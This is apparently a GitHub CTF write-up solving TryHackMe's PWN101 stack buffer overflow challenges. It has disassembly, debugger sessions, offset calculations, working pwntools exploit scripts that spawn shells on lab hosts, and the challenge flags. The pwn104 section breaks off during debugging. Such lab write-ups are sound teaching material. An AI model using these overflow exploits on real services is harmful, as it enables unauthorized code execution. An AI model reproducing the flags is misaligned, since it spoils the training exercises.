# PWN101

Beginner level binary exploitation challenges.

## Challenge 1: pwn101

Just overflow the program.............

```bash
❯ nc 10.10.112.167 9001
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks, Here's a small gift for you <3

ls
flag.txt
pwn101
pwn101.c
cat flag.txt
THM{7h4t's_4n_3zy_oveRflowwwww}

```

---

---

## Challenge 2: pwn102

let's open the binary in cutter:

---

<img width="1388" alt="Screenshot 2024-04-12 at 1 50 07 AM" src="https://github.com/Lynk4/THM/assets/44930131/842b2094-805f-47e2-9ba0-cd2702ba2953">

---

In gdb:

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000000006e0  _init
0x0000000000000710  puts@plt
0x0000000000000720  system@plt
0x0000000000000730  printf@plt
0x0000000000000740  setvbuf@plt
0x0000000000000750  __isoc99_scanf@plt
0x0000000000000760  exit@plt
0x0000000000000770  __cxa_finalize@plt
0x0000000000000780  _start
0x00000000000007b0  deregister_tm_clones
0x00000000000007f0  register_tm_clones
0x0000000000000840  __do_global_dtors_aux
0x0000000000000880  frame_dummy
0x000000000000088a  setup
0x00000000000008eb  banner
0x00000000000008fe  main
0x00000000000009b0  __libc_csu_init
0x0000000000000a20  __libc_csu_fini
0x0000000000000a24  _fini
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000000008fe <+0>:	push   rbp
   0x00000000000008ff <+1>:	mov    rbp,rsp
   0x0000000000000902 <+4>:	sub    rsp,0x70
   0x0000000000000906 <+8>:	mov    eax,0x0
   0x000000000000090b <+13>:	call   0x88a <setup>
   0x0000000000000910 <+18>:	mov    eax,0x0
   0x0000000000000915 <+23>:	call   0x8eb <banner>
   0x000000000000091a <+28>:	mov    DWORD PTR [rbp-0x4],0xbadf00d
   0x0000000000000921 <+35>:	mov    DWORD PTR [rbp-0x8],0xfee1dead
   0x0000000000000928 <+42>:	mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000092b <+45>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000092e <+48>:	mov    esi,eax
   0x0000000000000930 <+50>:	lea    rdi,[rip+0x212]        # 0xb49
   0x0000000000000937 <+57>:	mov    eax,0x0
   0x000000000000093c <+62>:	call   0x730 <printf@plt>
   0x0000000000000941 <+67>:	lea    rax,[rbp-0x70]
   0x0000000000000945 <+71>:	mov    rsi,rax
   0x0000000000000948 <+74>:	lea    rdi,[rip+0x217]        # 0xb66
   0x000000000000094f <+81>:	mov    eax,0x0
   0x0000000000000954 <+86>:	call   0x750 <__isoc99_scanf@plt>
   0x0000000000000959 <+91>:	cmp    DWORD PTR [rbp-0x4],0xc0ff33
   0x0000000000000960 <+98>:	jne    0x992 <main+148>
   0x0000000000000962 <+100>:	cmp    DWORD PTR [rbp-0x8],0xc0d3
   0x0000000000000969 <+107>:	jne    0x992 <main+148>
   0x000000000000096b <+109>:	mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000096e <+112>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000971 <+115>:	mov    esi,eax
   0x0000000000000973 <+117>:	lea    rdi,[rip+0x1ef]        # 0xb69
   0x000000000000097a <+124>:	mov    eax,0x0
   0x000000000000097f <+129>:	call   0x730 <printf@plt>
   0x0000000000000984 <+134>:	lea    rdi,[rip+0x1f4]        # 0xb7f
   0x000000000000098b <+141>:	call   0x720 <system@plt>
   0x0000000000000990 <+146>:	jmp    0x9a8 <main+170>
   0x0000000000000992 <+148>:	lea    rdi,[rip+0x1ef]        # 0xb88
   0x0000000000000999 <+155>:	call   0x710 <puts@plt>
   0x000000000000099e <+160>:	mov    edi,0x539
   0x00000000000009a3 <+165>:	call   0x760 <exit@plt>
   0x00000000000009a8 <+170>:	leave
   0x00000000000009a9 <+171>:	ret
End of assembler dump.
pwndbg>
```
so the binary checks arguments 0xc0ff33 , 0xc0d3 to pop a shell.

let's find a offset

We are writing at rsp 0x70 upto rbp 0x8

offset will be 104 in decimal and 0x68 in hex:

---

<img width="1429" alt="Screenshot 2024-04-12 at 1 45 11 AM" src="https://github.com/Lynk4/THM/assets/44930131/de210749-88fb-4871-8a99-56ac1acda792">

---

Now let's create the exploit

```python3
#!/usr/bin/python3

from pwn import *

context.binary = binary = "./pwn102-1644307392479.pwn102"

#0xc0ff33 0xc0d3

payload = b"A"*0x68 + p32(0xc0d3) + p32(0xc0ff33)

# process
p = remote("10.10.112.167", 9002)
p.recv()
p.sendline(payload)
p.interactive()
```
let's test it....

```bash
❯ python3 exploit.py
[*] '/home/lynk/thm/pwn101/pwn102/pwn102-1644307392479.pwn102'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 10.10.112.167 on port 9002: Done
[*] Switching to interactive mode

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
$ ls
flag.txt
pwn102
pwn102.c
$ cat flag.txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
$  
```

---

---

# Challenge 3: pwn103

By running the binary we options to choose....

I investigated all of the options, and the third is the most interesting.

- General
```bash
❯ ./pwn103-1644300337872.pwn103
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Try harder!!! 💪
zsh: segmentation fault  ./pwn103-1644300337872.pwn103
```

---

it's a scanf call

```bash
❯ r2 -d pwn103-1644300337872.pwn103
[0x7fd146fe3360]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7fd146fe3360]> afl
0x004010b0    1 43           entry0
0x004010f0    4 33   -> 31   sym.deregister_tm_clones
0x00401120    4 49           sym.register_tm_clones
0x00401160    3 33   -> 32   sym.__do_global_dtors_aux
0x00401190    1 6            entry.init0
0x004016e0    1 1            sym.__libc_csu_fini
0x004016e4    1 9            sym._fini
0x0040153e    1 22           sym.banner
0x00401040    1 6            sym.imp.puts
0x00401262    1 92           sym.announcements
0x0040158c    3 236  -> 176  main
0x004011f7    1 107          sym.rules
0x00401680    4 93           sym.__libc_csu_init
0x004012be    4 186          sym.general
0x004010e0    1 1            sym._dl_relocate_static_pie
0x00401554    1 56           sym.admins_only
0x00401050    1 6            sym.imp.system
0x004014e2    1 92           sym.discussion
0x00401378   12 362          sym.bot_cmd
0x00401000    3 23           sym._init
0x00401196    1 97           sym.setup
0x00401090    1 6            sym.imp.setvbuf
0x00401030    1 6            sym.imp.strncmp
0x00401060    1 6            sym.imp.printf
0x00401070    1 6            sym.imp.read
0x00401080    1 6            sym.imp.strcmp
0x004010a0    1 6            sym.imp.__isoc99_scanf
[0x7fd146fe3360]> pdf @sym.general
┌ 186: sym.general ();
│           ; var int64_t var_20h @ rbp-0x20
│           0x004012be      55             push rbp
│           0x004012bf      4889e5         mov rbp, rsp
│           0x004012c2      4883ec20       sub rsp, 0x20
│           0x004012c6      488d05dd1000.  lea rax, [0x004023aa]       ; "\n\U0001f5e3  General:\n"
│           0x004012cd      4889c7         mov rdi, rax
│           0x004012d0      e86bfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012d5      488d05e41000.  lea rax, str._______jopraveen_:_Hello_pwners_ ; 0x4023c0 ; "------[jopraveen]: Hello pwners \U0001f44b"
│           0x004012dc      4889c7         mov rdi, rax
│           0x004012df      e85cfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012e4      488d05fd1000.  lea rax, str._______jopraveen_:_Hope_youre_doing_well_ ; 0x4023e8 ; "------[jopraveen]: Hope you're doing well \U0001f604"
│           0x004012eb      4889c7         mov rdi, rax
│           0x004012ee      e84dfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012f3      488d051e1100.  lea rax, str._______jopraveen_:_You_found_the_vuln__right__ ; 0x402418 ; "------[jopraveen]: You found the vuln, right? \U0001f914\n"
│           0x004012fa      4889c7         mov rdi, rax
│           0x004012fd      e83efdffff     call sym.imp.puts        
   ; int puts(const char *s)
│           0x00401302      488d05431100.  lea rax, str._______pwner_:_ ; 0x40244c ; "------[pwner]: "
│           0x00401309      4889c7         mov rdi, rax
│           0x0040130c      b800000000     mov eax, 0
│           0x00401311      e84afdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401316      488d45e0       lea rax, [var_20h]
│           0x0040131a      4889c6         mov rsi, rax
│           0x0040131d      488d05381100.  lea rax, [0x0040245c]       ; "%s"
│           0x00401324      4889c7         mov rdi, rax
│           0x00401327      b800000000     mov eax, 0
│           0x0040132c      e86ffdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00401331      488d45e0       lea rax, [var_20h]
│           0x00401335      488d15231100.  lea rdx, [0x0040245f]       ; "yes"
│           0x0040133c      4889d6         mov rsi, rdx
│           0x0040133f      4889c7         mov rdi, rax
│           0x00401342      e839fdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x00401347      85c0           test eax, eax
│       ┌─< 0x00401349      751b           jne 0x401366
│       │   0x0040134b      488d05111100.  lea rax, str._______jopraveen_:_GG__n ; 0x402463 ; "------[jopraveen]: GG \U0001f604\n"
│       │   0x00401352      4889c7         mov rdi, rax
│       │   0x00401355      e8e6fcffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x0040135a      b800000000     mov eax, 0
│       │   0x0040135f      e828020000     call main                   ; int main(int argc, char **argv, char **envp)
│      ┌──< 0x00401364      eb0f           jmp 0x401375
│      │└─> 0x00401366      488d05121100.  lea rax, str.Try_harder____ ; 0x40247f ; "Try harder!!! \U0001f4aa"
│      │    0x0040136d      4889c7         mov rdi, rax
│      │    0x00401370      e8cbfcffff     call sym.imp.puts           ; int puts(const char *s)
│      │    ; CODE XREF from sym.general @ 0x401364
│      └──> 0x00401375      90             nop
│           0x00401376      c9             leave
└           0x00401377      c3             ret
```

So we can overwrite the memory and redirect the execution to an other location. So the next goal is to identify a specific site where the execution should be returned.

there's a funtion ***admins_only*** we will redirect it to this function.

so let's find the offset of the program:

---

```bash
pwndbg> run
Starting program: /home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Try harder!!! 💪

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401377 in general ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────
*RAX  0x13
*RBX  0x7fffffffe428 : ▸ 0x7fffffffe689 ◂:  '/home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103'
*RCX  0x7ffff7ec0b00 (write+16) ◂:  cmp rax, -0x1000 /* 'H=' */
 RDX  0x0
*RDI  0x7ffff7f9ea30 (_IO_stdfile_1_lock) ◂:  0x0
*RSI  0x7ffff7f9d803 (_IO_2_1_stdout_+131) ◂:  0xf9ea30000000000a /* '\n' */
*R8   0x65
*R9   0x7ffff7f9caa0 (_IO_2_1_stdin_) ◂:  0xfbad208b
*R10  0x7ffff7de1e80 ◂:  0x10001a00007bf8
*R11  0x202
 R12  0x0
*R13  0x7fffffffe438 : ▸ 0x7fffffffe6c2 ◂:  'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 R14  0x0
*R15  0x7ffff7ffd000 (_rtld_global) : ▸ 0x7ffff7ffe2d0 ◂:  0x0
*RBP  0x6161616161616165 ('eaaaaaaa')
*RSP  0x7fffffffe2f8 ◂:  'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x401377 (general+185) ◂:  ret 
─────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────
 ► 0x401377 <general+185>    ret    <0x6161616161616166>

───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe2f8 ◂:  'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│     0x7fffffffe300 ◂:  'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
02:0010│     0x7fffffffe308 ◂:  'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
03:0018│     0x7fffffffe310 ◂:  'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
04:0020│     0x7fffffffe318 ◂:  'jaaaaaaakaaaaaaalaaaaaaamaaa'
05:0028│     0x7fffffffe320 ◂:  'kaaaaaaalaaaaaaamaaa'
06:0030│     0x7fffffffe328 ◂:  'laaaaaaamaaa'
07:0038│     0x7fffffffe330 ◂:  0x6161616d /* 'maaa' */
─────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────
 ► 0         0x401377 general+185
   1 0x6161616161616166
   2 0x6161616161616167
   3 0x6161616161616168
   4 0x6161616161616169
   5 0x616161616161616a
   6 0x616161616161616b
   7 0x616161616161616c
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
pwndbg>
```

---

Offset is 40 

lets craft the payload 

basically it will be like

padding + admins_only function

Here’s the exploit.

---

```python3
from pwn import *

context.binary = binary = ELF("./pwn103-1644300337872.pwn103")

#p = process()
p = remote("10.10.96.138", 9003)
p.sendline(b"3")

admins_only_function = p64(binary.symbols.admins_only)
payload = b"A"*40 + admins_only_function + admins_only_function

p.sendline(payload)
p.interactive()
```

---
we have used admins_only functions 2 times to esablish a stable shell.

let's run the exploit

```bash
❯ python3 exploit.py
[*] '/home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 10.10.96.138 on port 9003: Done
[*] Switching to interactive mode
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 
🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
[*] Got EOF while reading in interactive
$ ls
$ ls -la
[*] Closed connection to 10.10.96.138 port 9003
[*] Got EOF while sending in interactive
❯ python3 exploit.py
[*] '/home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 10.10.96.138 on port 9003: Done
[*] Switching to interactive mode
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 
🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: Try harder!!! 💪

👮  Admins only:

Welcome admin 😄

👮  Admins only:

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 
🗣  General:

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 
🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: Try harder!!! 💪

👮  Admins only:

Welcome admin 😄

👮  Admins only:

Welcome admin 😄
$ ls
flag.txt
pwn103
pwn103.c
$ cat flag.txt
THM{w3lC0m3_4Dm1N}
$
```

---

---

# Challenge 4: pwn104

Bsic file check:

---
```bash
❯ file pwn104-1644300377109.pwn104
pwn104-1644300377109.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped
❯ checksec --file=pwn104-1644300377109.pwn104
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATSymbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   46 Symbols	 No	0		2		pwn104-1644300377109.pwn104

```
---

let's run the program

---
```bash
❯ ./pwn104-1644300377109.pwn104
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104          

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7ffd2604b330
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
zsh: segmentation fault  ./pwn104-1644300377109.pwn104

```
---

We observe that it leaks a stack address and accepts our input.

Analyzing the binary in ghidra

---

<img width="1397" alt="Screenshot 2024-04-15 at 2 56 19 AM" src="https://github.com/Lynk4/THM/assets/44930131/ea6746c8-a433-4c83-8dc3-0e8b8bcdafff">

---

We observe what the programme does.

1. Brings out the banner 
2. Leaks the address of the beginning of our input buffer on the stack.
3. Receives our input and reads 200 bytes of data into a buffer that can only hold up to 80 bytes of data. # Bug here

So firstly we will find the offset:
I'm using gdb

---
```bash
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104          

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7fffffffe2c0
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x000000000040124e in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────[ REGISTERS / show-flags off / show-compact-regs off ]───────
*RAX  0x65
*RBX  0x7fffffffe428 : ▸ 0x7fffffffe68a ◂:  '/home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104'
*RCX  0x7ffff7ec0a5d (read+13) ◂:  cmp rax, -0x1000 /* 'H=' */
*RDX  0xc8
 RDI  0x0
*RSI  0x7fffffffe2c0 ◂:  0x6161616161616161 ('aaaaaaaa')
*R8   0x78
 R9   0x0
*R10  0x7ffff7dd8b08 ◂:  0x10001200001a3f
*R11  0x246
 R12  0x0
*R13  0x7fffffffe438 : ▸ 0x7fffffffe6c3 ◂:  'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 R14  0x0
*R15  0x7ffff7ffd000 (_rtld_global) : ▸ 0x7ffff7ffe2d0 ◂:  0x0
*RBP  0x616161616161616b ('kaaaaaaa')
*RSP  0x7fffffffe318 ◂:  0x616161616161616c ('laaaaaaa')
*RIP  0x40124e (main+129) ◂:  ret 
────────────────[ DISASM / x86-64 / set emulate on ]────────────────
 ► 0x40124e <main+129>    ret    <0x616161616161616c>

─────────────────────────────[ STACK ]──────────────────────────────
00:0000│ rsp 0x7fffffffe318 ◂:  0x616161616161616c ('laaaaaaa')
01:0008│     0x7fffffffe320 ◂:  0x7f0a6161616d
02:0010│     0x7fffffffe328 : ▸ 0x4011cd (main) ◂:  push rbp
03:0018│     0x7fffffffe330 ◂:  0x100400040 /* '@' */
04:0020│     0x7fffffffe338 : ▸ 0x7fffffffe428 : ▸ 0x7fffffffe68a ◂:  '/home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104'
05:0028│     0x7fffffffe340 : ▸ 0x7fffffffe428 : ▸ 0x7fffffffe68a ◂:  '/home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104'
06:0030│     0x7fffffffe348 ◂:  0x36cf4868f6a97138
07:0038│     0x7fffffffe350 ◂:  0x0
───────────────────────────[ BACKTRACE ]────────────────────────────
 ► 0         0x40124e main+129
   1 0x616161616161616c
   2   0x7f0a6161616d
   3         0x4011cd main
   4      0x100400040
   5   0x7fffffffe428
